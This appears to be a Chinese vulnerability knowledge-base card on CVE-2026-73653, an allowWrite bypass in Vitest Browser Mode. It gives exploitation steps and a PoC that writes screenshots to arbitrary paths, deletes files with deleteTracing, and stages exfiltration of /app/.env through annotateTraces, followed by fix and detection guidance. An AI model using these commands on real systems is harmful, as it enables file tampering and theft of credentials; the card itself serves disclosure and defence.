---
id: web-generic-auth-vitest-browser-write-delete-artifact-exfil
title: Vitest Browser Mode 写盘/删除/artifact 外带命令绕过 allowWrite 统一闸门（CVE-2026-73653）
type: scenario
domain: web
path: web/generic/auth
technique: browser-rpc-provider-command-missing-write-gate
aliases:
- CVE-2026-73653
- GHSA-p63j-vcc4-9vmv
- Vitest allowWrite 绕过
- page.screenshot 任意路径写入
- toMatchScreenshot 隐式写盘
- stopChunkTrace 写 trace
- deleteTracing 任意文件删除
- annotateTraces artifact 外带
- browser.api.allowWrite false 失效
tags:
- vitest
- browser-mode
- playwright
- allow-write-bypass
- arbitrary-file-write
- arbitrary-file-delete
- artifact-exfiltration
- permission-bypass
- cve-2026-73653
- testing-toolchain
cve:
- CVE-2026-73653
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: < 3.2.7；>= 4.0.0, < 4.1.10；>= 5.0.0-beta.1, < 5.0.0-beta.6（修复版本 3.2.7 / 4.1.10 / 5.0.0-beta.6）
verification:
  verified_by: verifier-V26
  verified_at: '2026-11-05T02:54:46+08:00'
  notes: 已对照原文与11张图核对：takeScreenshot 的 normalize→mkdir→screenshot({path}) 绕过 allowWrite 与源码一致；容器内 4.1.9 生成 out.png，4.1.10 抛 Cannot modify file；screenshotMatcher 隐式写盘、stopChunkTrace、deleteTracing、annotateTraces 与 artifact attachment 仅源码/补丁确认，原文未做运行时验证，卡内已标 medium 与边界。版本区间与 CVE 正确；未复跑 PoC；frontmatter 无 sources/source_url。
---

## 一句话结论

Vitest Browser Mode 的 `takeScreenshot`、`screenshotMatcher`、`stopChunkTrace`、`deleteTracing`、`annotateTraces` 在 Node/provider 侧直接 `mkdir`/`writeFile`/`screenshot({ path })`/`unlink`/`recordArtifact`，不统一执行 `api.allowWrite` 与 `server.fs` 检查。配置里写 `allowWrite: false` 也无法阻止浏览器侧在 Vitest 进程权限下按任意路径写入 PNG/trace、删除文件，或借 artifact attachment 延迟外带本地文件；Playwright provider 下写、删、外带三类原语均有明确落点，其中显式截图写盘已本地复现。

## 原理

- **共享分发模型**：所有命令都经浏览器侧 `triggerCommand` 进入 Node 侧 `project.browser.triggerCommand(...)`，再由 provider 命令实现文件操作。安全策略存在，但只被部分命令复用；没有统一的 mandatory gate，遗漏检查的命令就成为独立旁路。
- **显式写盘**：`takeScreenshot` 在 `options.save` 为真时执行 `normalize(path)` → `mkdir(dirname(savePath), { recursive: true })` → `page.screenshot({ path: savePath })`。只看 `save`，不看 `api.allowWrite`，也不看 `server.fs`；路径来自浏览器侧参数。
- **隐式写盘**：`toMatchScreenshot` 表面是断言，却在 `performSideEffects` 的 `missing-reference` / `update-reference` / `mismatch` 分支调用 `writeScreenshot()`；后者直接 `mkdir` + `writeFile`。审计只盯显式接收 `path` 的 API 时很容易漏掉 matcher 的副作用。
- **trace 写 + 删 + 外带**：`stopChunkTrace` 把 trace 写到 `resolveTracesPath(...)` 后调用 `tracing.stopChunk({ path })`；`deleteTracing` 对 `traces[]` 直接 `unlink(trace)`；`annotateTraces` 把 `trace` 写进 `recordArtifact` 的 `attachment.path`。`rpc.ts` 的 `onTaskArtifactRecord` 在 `canWrite` 为假时会移除 attachment，但在允许写的分支只记录 artifact，没有对 path 做文件访问检查——真正的文件复制/打包/导出发生在后续 reporter 或 artifact 流程，形成“延迟外带”。
- **为什么 `allowWrite: false` 失效**：策略检查本应在每个写、删、覆盖、复制动作前执行，但这些命令各自实现文件操作，没有调用统一检查；配置项制造了“已有隔离”的错觉。
- **内容约束**：写出的内容是 PNG、diff/reference 图或 trace zip，不是任意字节；攻击者主要控制写到哪里、覆盖什么、删除什么。漏洞不绕过 OS 权限，也不等同于任意内容写入或 RCE。

## 触发条件

- 目标使用 Vitest `< 3.2.7`、`>= 4.0.0, < 4.1.10` 或 `>= 5.0.0-beta.1, < 5.0.0-beta.6` 的 Browser Mode，且配置了 `browser.api`。
- 攻击者能触达 Browser Mode API（`host` 对外暴露）或能控制被测代码；仅本机 `localhost` 且测试代码可信时，风险体现为隔离假设失效。
- 写/删目标路径对 Vitest Node 进程可写/可删；trace 相关原语要求 Playwright provider（WebdriverIO 不支持 tracing）。
- `screenshotMatcher` 的写盘路径还受 reference/actual/diff 命名规则塑形，路径自由度不如显式 `page.screenshot({ path })`。
- artifact 外带需要后续 reporter/artifact copy 流程真实读取 `attachment.path`；原文未做运行时外带验证。

## 利用步骤

1. 确认版本落在受影响区间，确认 provider 类型与 `browser.api` 暴露面。
2. 显式写盘：调用 `page.screenshot({ path: '<目标绝对路径>', save: true })`；`resolveScreenshotPath` 与 `normalize` 不会把路径限制在项目根内。
3. 隐式写盘：触发 `toMatchScreenshot()` 的 `missing-reference` / `update-reference` / `mismatch` 分支，向 reference/actual/diff 路径写图。
4. 删除：调用 trace 命令 `deleteTracing({ traces: ['<目标路径>'] })`，Node 侧直接 `unlink`。
5. 外带：调用 `annotateTraces({ traces: ['<敏感文件>'], testId })`，让路径进入 artifact attachment；等待 reporter/artifact copy 把文件复制、打包或上传。
6. 用写盘覆盖测试产物、快照、配置或构建输出，或用删除破坏构建/测试状态；外带则瞄准 `.env`、token、云凭据、SSH key 等。

## PoC

```javascript
// 配置：allowWrite 明确为 false，仍应拒绝写入
// browser.api = { host: '0.0.0.0', port: 63315, allowWrite: false }

// 显式写盘（本地已复现）
test('write screenshot while allowWrite is false', async () => {
  await page.screenshot({ path: '/app/repro-output/out.png' })
  // 脆弱版：out.png 被创建；修复版抛 Cannot modify file "/app/repro-output/out.png"
})

// 隐式写盘（源码确认）
await expect(page).toMatchScreenshot('home')   // missing/update 分支写 reference 图

// 删除（源码确认，Playwright provider）
await triggerCommand('__vitest_deleteTracing', { traces: ['/app/important.file'] })

// 外带（源码确认，延迟触发）
await triggerCommand('__vitest_annotateTraces', {
  testId: 't1', traces: ['/app/.env'],
})
```

```text
本地对照（Playwright provider，vitest@4.1.9 -> 4.1.10）：
脆弱版：/app/repro-output/out.png 存在，测试通过
修复版：page.screenshot 抛 "Cannot modify file ..."，目录中不再生成 out.png
删除 / annotate：原文仅做源码调用链与补丁分析，未做运行时验证
```

## 变体与关联

- 变体（WebdriverIO）：截图写入仍受影响；`stopChunkTrace`/`deleteTracing`/`annotateTraces` 依赖 Playwright tracing，不纳入该 provider 的实证范围。
- 变体（artifact 链路）：`annotateTraces` 第一跳只写 metadata，真正的文件访问在 reporter/artifact copy 阶段；只检查命令执行瞬间会漏掉这条延迟外带。
- 关联：[[web-generic-auth-vitest-browser-upload-arbitrary-file-read]]（同 CVE 的读取链，共享 `triggerCommand` → provider 分发模型）。
- 关联：[[crypto-implementation-5g-aka-xres-star-log-leak]]（同为“机密/高权限能力已存在，但边界检查没有覆盖所有消费路径”的实现缺陷，可对照 mandatory gate 分析法）。
- 边界：写出的内容受限于 PNG/trace 格式，不能直接写任意 payload；未证明单独达到 RCE；OS 文件权限仍生效；artifact 外带依赖后续流程。

## 检测与防御

- 修复：升级到 `3.2.7`、`4.1.10`、`5.0.0-beta.6` 或更高。补丁新增 `assertBrowserApiWrite(project, path)` 与 `assertBrowserFileAccess(project, path)`，并在 `takeScreenshot`、`screenshotMatcher` 的 `writeScreenshot`、`stopChunkTrace`、`deleteTracing`、`annotateTraces` 及 `rpc.ts` 的 artifact attachment 路径上统一调用。
- 暴露面收缩：不要把 `browser.api.host` 绑定到 `0.0.0.0`；远程访问需加来源限制、认证与反代；CI 中禁止不可信 PR 直接连接 Browser Mode。
- 隔离：`allowWrite: false` 在脆弱版本不是安全边界，不能作为不可信测试代码的隔离手段；应在容器/CI 层用只读挂载与最小权限兜底。
- 代码审计：搜索 `mkdir`、`writeFile`、`screenshot({ path })`、`unlink`、`recordArtifact`、`attachment.path`，逐个确认 sink 前是否经过同一个 mandatory 检查；特别检查 matcher 等“看起来只做比较”的副作用分支。
- 检测：测试产物目录出现非预期新增/覆盖、构建输出被 PNG 覆盖、`unlink` 删除非 trace 文件；artifact/报告体积异常增大或包含项目外路径；Browser Mode 进程对 `.env`、`~/.ssh`、CI 凭据路径的访问。
- 加固：升级后仍应审计新增 provider 命令是否复用两个 assert 函数；把权限契约写成回归测试（拒绝读取、拒绝写入、禁写分支），防止重构再次旁路。
